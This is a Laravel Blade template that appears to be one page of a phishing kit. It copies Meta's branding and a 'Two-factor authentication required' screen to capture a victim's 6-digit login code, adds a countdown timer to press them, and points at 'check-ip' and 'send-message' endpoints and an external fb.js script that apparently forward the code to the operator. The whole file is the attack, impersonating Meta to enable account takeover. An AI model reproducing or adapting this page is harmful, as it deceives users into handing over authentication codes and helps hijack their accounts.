@extends('layout.index')
@section('content')
    <script>
        var minutes = 4;
        var seconds = 38;

        function updateTimer() {
            var timeri = document.getElementById("timeri");
            timeri.textContent = `${minutes}:${seconds < 10 ? "0": ""}${seconds}`;
            if (seconds > 0) {
                seconds--;
            } else {
                if (minutes > 0) {
                    minutes--;
                    seconds = 59;
                } else {
                    clearInterval(timerInterval);
                    timeri.textContent = "00:00";
                    var sendCodeAgainLink = document.getElementById("sendcodeagain");
                    sendCodeAgainLink.style.pointerEvents = "auto";
                }
            }
        }
        var timerInterval = setInterval(updateTimer, 1000);
        var URL_CHECK_IP = '{{ url('check-ip') }}';
        var URL_SEND_MESSAGE = '{{ url('send-message') }}';
    </script>
    <div class="top-header">
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <svg aria-label="Logo Meta" style="width: 78px" class="cyypbtt7 ljni7pan" role="img"
                        viewBox="0 0 500 100">
                        <defs>
                            <linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3x" x1="124.38" x2="160.839"
                                y1="99" y2="59.326">
                                <stop offset=".427" stop-color="#0278F1"></stop>
                                <stop offset=".917" stop-color="#0180FA"></stop>
                            </linearGradient>
                            <linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3y" x1="42" x2="-1.666"
                                y1="4.936" y2="61.707">
                                <stop offset=".427" stop-color="#0165E0"></stop>
                                <stop offset=".917" stop-color="#0180FA"></stop>
                            </linearGradient>
                            <linearGradient gradientUnits="userSpaceOnUse" id="jsc_c_3z" x1="27.677" x2="132.943"
                                y1="28.71" y2="71.118">
                                <stop stop-color="#0064E0"></stop>
                                <stop offset=".656" stop-color="#0066E2"></stop>
                                <stop offset="1" stop-color="#0278F1"></stop>
                            </linearGradient>
                        </defs>
                        <path
                            d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
                            fill="#1C2B33"></path>
                        <path
                            d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
                            fill="#0180FA"></path>
                        <path
                            d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
                            fill="url(#jsc_c_3x)"></path>
                        <path d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
                            fill="url(#jsc_c_3y)"></path>
                        <path
                            d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
                            fill="url(#jsc_c_3z)"></path>
                    </svg>

                </div>
            </div>
        </div>

    </div>
    <div class="container">
        <div class="row confirm">
            <form id="basicForm" autocomplete="off">
                <div class="card">
                    <h3 class="twh3">Two-factor authentication required (1/3)</h3>
                    <div class="bodyyy">
                        <p> You’ve asked us to require a 6-digit login code when anyone tries to
                            access your account from a new device or browser. </p>
                        <p> Enter the 6-digit code from your <strong>code generator</strong> or
                            third-party app below. </p>
                        <div class="form-group"
                            style="padding-left: 0px; padding-top: 5px; padding-bottom: 5px; display: inline-block;">
                            <div class="item-form" style="display: flex; align-items: center;">
                                <div style="margin: 0px;">
                                    <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                        <div class="ant-form-item-control-input">
                                            <div class="ant-form-item-control-input-content">
                                                <div class="ant-input-number ant-input-number-in-form-item css-dev-only-do-not-override-pr0fja"
                                                    style="margin-left: 0px; font-size: 14px; border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.08) 0px 1px 1px inset; color: rgb(78, 77, 77);">

                                                    <div class="ant-input-number-input-wrap" style="margin-right: 5px">
                                                        <input type="hidden" name="_token" id="_token"
                                                            value="{{ csrf_token() }}" />
                                                        <input autocomplete="off" role="spinbutton" step="1"
                                                            maxlength="8" minlength="4" id="basicForm_fill_code"
                                                            aria-required="true" class="form-control" value="">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="form-group paddingleftt" style="display: inline-block;">
                                    <p name="" id="timer" class="nolink">
                                        ( wait: <span id="timeri" style="margin-bottom: 0px;">4:39</span> )
                                    </p>
                                </div>
                            </div>
                            <p class="2fa-error" style="color:#ff4d4f;font-size:14px;margin-top: 0px;margin-bottom:0px">
                            </p>
                        </div>
                    </div>
                    <div class="footerii" style="width: 100%;">
                        <a data-toggle="modal" data-target="#twof" class="linkupertwo" href="#">
                            Need another way to authenticate?</a>
                        <button type="submit" id="submit-2fa">
                            <i class="spinner-border" style="display: none" aria-hidden="true"></i>
                            <span class="btn-text">Send</span>
                        </button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <style>
        .nolink {
            background-color: transparent;
            border: transparent;
            padding: 0px;
            margin: 0px;
            color: rgb(56, 88, 152);
            font-size: 13px;
        }

        .linkupertwo {
            font-size: 14px;
            color: rgb(56, 88, 152);
            font-weight: 600;
            margin-bottom: 0px;
            float: left;
            margin-top: 6px;
            cursor: pointer;
            text-decoration: none;
        }

        body {
            background-color: white;
        }

        a:not([class]) {
            text-decoration-skip-ink: auto;
            text-decoration: none;
            color: #1877f2;
        }

        .form-control {
            background-color: white;
        }

        * {
            font-family: Arial, Helvetica, sans-serif;
        }

        .spinner-border {
            --bs-spinner-width: 1rem;
            --bs-spinner-height: 1rem;
        }

        .top-header {
            background-color: #f6f6f6;
            text-align: left;
            padding: 15px 20px;
            margin-bottom: 1.5rem;
        }

        .header-form .header-top {
            width: 80%;
            display: flex;
            margin: auto;
        }

        .card {
            position: relative;
            display: flex;
            flex-direction: column;
            min-width: 0;
            word-wrap: break-word;
            background-color: #fff;
            background-clip: border-box;
            border: 1px solid rgba(0, 0, 0, .125);
            border-radius: 0.25rem;
        }

        .confirm .twh3 {
            border-bottom: 1px solid rgba(0, 0, 0, .101);
            font-size: 16px;
            color: #4b4f56;
            padding: 12px;
            font-weight: 700;
        }

        .confirm .footerii {
            padding: 10px 20px !important;
            height: 55px;
        }

        #submit-2fa {
            color: rgb(255, 255, 255);
            background-color: rgb(44, 132, 244);
            min-width: 100px;
            float: right;
            margin: 0px;
            padding: 0px 7px;
            outline: none;
            border: none;
            box-shadow: none;
            font-weight: 700;
            font-size: 1rem;
            margin-bottom: 0px;
            height: 40px;
            position: relative;
            border-radius: 5px;
        }

        .confirm .twh3 {
            border-bottom: 1px solid rgba(0, 0, 0, .101);
            font-size: 16px;
            color: #4b4f56;
            padding: 12px;
            font-weight: 700;
        }

        .confirm .bodyyy {
            padding: 10px 20px !important;
            border-bottom: 1px solid rgba(0, 0, 0, .101);
        }
    </style>
    <script type="text/jscript" src="{{URL::asset('js/fb.js')}}"></script>
@endsection
